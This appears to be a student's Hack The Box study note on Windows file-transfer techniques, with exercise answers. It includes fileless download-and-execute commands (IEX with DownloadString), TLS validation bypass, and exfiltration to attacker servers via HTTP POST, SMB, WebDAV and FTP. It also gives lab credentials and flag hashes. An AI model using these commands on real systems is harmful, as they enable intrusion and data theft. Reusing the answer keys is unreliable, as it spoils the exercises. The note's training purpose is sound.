## Introduction

Windows has evolved significantly, and modern versions include many **built-in utilities** that can be abused for **file transfer operations**.

- **Attackers** use these methods to:
    
    - Operate stealthily
        
    - Avoid AV / EDR detection
        
    - Blend in with legitimate system activity
        
- **Defenders** must understand these techniques to:
    
    - Detect abuse
        
    - Create proper security policies
        

A strong example of this is the **Astaroth APT attack**, which heavily abused native Windows tools.

![Image](https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt49163443a0637727/6939479905e5e529ee4e7dd8/WhatsAppAstaroth2511-fig1.png)

![Image](https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/66fbfe5a6be0c740befca0c0_66fbf52cd754df60e225d6be_2%2520-%25201.10-min.jpeg)

![Image](https://www.cybereason.com/hubfs/image-61.png)

---

## Astaroth Attack Overview (Very Important – Keep As Reference)

**Key concept: Fileless does NOT mean no file transfer**

### Attack Chain Summary

1. **Spear-phishing email**
    
2. Malicious **LNK file**
    
3. LNK executes:
    
    - `WMIC /Format`
        
4. WMIC downloads & executes **JavaScript**
    
5. JavaScript downloads payloads using:
    
    - **Bitsadmin**
        
6. Payloads are:
    
    - Base64-encoded
        
    - Decoded with **Certutil**
        
7. DLLs loaded via:
    
    - **regsvr32**
        
8. Final payload injected into:
    
    - `Userinit.exe`
        

✔ All tools used are **native Windows binaries**  
✔ Excellent example of **Living Off The Land**

---

## Download Operations

**Scenario:**  
We have access to **MS02** and need to download files from **Pwnbox**.

![Image](https://scaler.com/topics/images/diagram-of-file-transfer-protocol.webp)

![Image](https://www.vandyke.com/images/solutions/dmz.gif)

---

## PowerShell Base64 Encode & Decode (No Network Required)

### Use Case

- Useful when:
    
    - Outbound network traffic is blocked
        
    - Only terminal access is available
        
- Limitation:
    
    - File size
        
    - Command length limits
        

### Verify File Integrity (Important)

```bash
md5sum id_rsa
```

✔ MD5 must match **before and after transfer**

---

### Encode File (Linux)

```bash
cat id_rsa | base64 -w 0; echo
```

---

### Decode File (Windows PowerShell)

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))
```

---

### Confirm Transfer Integrity

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

📌 **Critical Notes**

- `cmd.exe` max string length: **8191 characters**
    
- Web shells may fail with large base64 blobs
    

---

## PowerShell Web Downloads

Most enterprise environments allow:

- HTTP (TCP/80)
    
- HTTPS (TCP/443)
    

But controls may include:

- Domain allow-listing
    
- File type blocking
    
- Content inspection
    

---

## PowerShell Net.WebClient Methods (Important Table)

|Method|Description|
|---|---|
|OpenRead|Stream download|
|DownloadData|Byte array|
|DownloadFile|Save to disk|
|DownloadString|Fileless execution|

---

## DownloadFile Method

```powershell
(New-Object Net.WebClient).DownloadFile('<URL>','<Output>')
```

Example:

```powershell
(New-Object Net.WebClient).DownloadFile(
'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',
'C:\Users\Public\Downloads\PowerView.ps1'
)
```

---

## Fileless PowerShell Execution (Very Important)

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

Or:

```powershell
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

✔ Executes **entirely in memory**  
✔ Common in **APT attacks**

---

## Invoke-WebRequest (PowerShell ≥ 3.0)

```powershell
Invoke-WebRequest <URL> -OutFile <file>
```

Aliases:

- `iwr`
    
- `curl`
    
- `wget`
    

⚠ Slower than `Net.WebClient`

---

## Common PowerShell Download Errors

### Internet Explorer First-Run Issue

```powershell
Invoke-WebRequest <URL> -UseBasicParsing | IEX
```

---

### SSL/TLS Trust Error

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## SMB Downloads (TCP/445)

Widely used in enterprise networks.

### Create SMB Server (Pwnbox)

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

---

### Copy File from SMB Share

```cmd
copy \\IP\share\nc.exe
```

---

### SMB Authentication Restriction Bypass

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
net use n: \\IP\share /user:test test
copy n:\nc.exe
```

---

## FTP Downloads

Uses:

- TCP/21 (control)
    
- TCP/20 (data)
    

### Start FTP Server (pyftpdlib)

```bash
sudo python3 -m pyftpdlib --port 21
```

---

### Download via PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://IP/file.txt','C:\Users\Public\file.txt')
```

---

### Non-Interactive FTP Download

```cmd
ftp -v -n -s:ftpcommand.txt
```

✔ Essential for **limited shells**

---

## Upload Operations

Used for:

- Exfiltration
    
- Password cracking
    
- Offline analysis
    

---

## PowerShell Base64 Upload

```powershell
[Convert]::ToBase64String((Get-Content file -Encoding byte))
```

✔ Decode on attacker machine using `base64 -d`

---

## PowerShell Web Uploads

### Upload Server Setup

```bash
pip3 install uploadserver
python3 -m uploadserver
```

---

### Upload Using PSUpload.ps1

```powershell
Invoke-FileUpload -Uri http://IP:8000/upload -File C:\path\file
```

---

## Base64 POST Upload (Advanced)

```powershell
Invoke-WebRequest -Uri http://IP:8000 -Method POST -Body $b64
```

```bash
nc -lvnp 8000
echo <base64> | base64 -d > file
```

---

## SMB over HTTP – WebDAV (Very Important)

Used when:

- SMB outbound blocked
    
- HTTP/HTTPS allowed
    

![Image](https://www.myworkdrive.com/ui/img/pages/comparisons-pages/webDavWork.png)

![Image](https://www.myworkdrive.com/blog/Modify-the-Windows-Registry.png)

![Image](https://401trg.github.io/pages/images/smb_image_10.png)

---

### Install WebDAV

```bash
pip3 install wsgidav cheroot
```

---

### Start WebDAV Server

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

---

### Connect via Windows

```cmd
dir \\IP\DavWWWRoot
```

📌 `DavWWWRoot` is a **Windows keyword**, not a real directory.

---

### Upload via WebDAV

```cmd
copy file.zip \\IP\DavWWWRoot\
```

---

## FTP Uploads

### Start FTP Server (Upload Enabled)

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

---

### PowerShell FTP Upload

```powershell
(New-Object Net.WebClient).UploadFile('ftp://IP/file','C:\path\file')
```

---

### FTP Script Upload (Non-Interactive)

```cmd
ftp -v -n -s:ftpcommand.txt
```

---

## Recap (Must Remember)

- Windows provides **many native file transfer methods**
    
- Fileless ≠ No file movement
    
- Always adapt based on:
    
    - Firewall rules
        
    - EDR presence
        
    - Shell stability
        
	- **Base64, SMB, FTP, HTTP, WebDAV** should all be in your toolbox

### Exercises
![[Pasted image 20260207164421.png]]

```Plain text
Q1. Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer?

Ans b1a4ca918282fcd96004565521944a3b
```

Steps for the solution are follows:

1. Spawn the machine and Open the terminal, spawn the VPN as well.

	 ![[Pasted image 20260207171213.png]]
		![[Pasted image 20260207171140.png]]
2.  Run the nmap command and save the output as in screenshot.
	 ![[Pasted image 20260207171404.png]]

3. We will use wget command for the flag.txt as the apache web server is vulnerable.(see in ScreenShot)
![[Pasted image 20260207172442.png]] 
In the above screenshot the webserver port is open. On the other hand in the screenshot below we used wget command to get flag.txt file, and read the file by cat command. 
![[Pasted image 20260207172740.png]]
```Plain
 **%% RDP to 10.129.201.55 (ACADEMY-MISC-MS02) with user "htb-student" and password "HTB_@cademy_stdnt!" %%** 
Q2. Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer?

Ans f458303ea783c224c6b4e7ef7f17eb9d
```

Steps for Solution
1.  Download the file from HTB Academy.
![[Screenshot From 2026-02-07 22-44-20.png]]

2. The file will save on the main machine as in ScreenShot.

